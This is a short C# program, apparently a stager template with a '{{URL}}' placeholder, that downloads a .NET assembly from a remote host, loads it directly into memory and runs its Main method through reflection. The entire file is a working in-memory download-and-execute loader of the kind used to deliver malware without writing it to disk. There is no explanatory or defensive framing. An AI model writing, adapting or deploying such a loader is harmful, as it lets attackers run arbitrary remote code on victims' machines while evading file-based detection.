using System;
using System.Reflection;
using System.Reflection;

namespace Craft
{
    public class Program
    {
        public static void Main()
        {
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] data = client.DownloadData("{{URL}}");
            Assembly asm = Assembly.Load(data);
            Type program = asm.GetType("Craft.Program");
            MethodInfo main = program.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            main.Invoke(null, null);
        }
    }
}
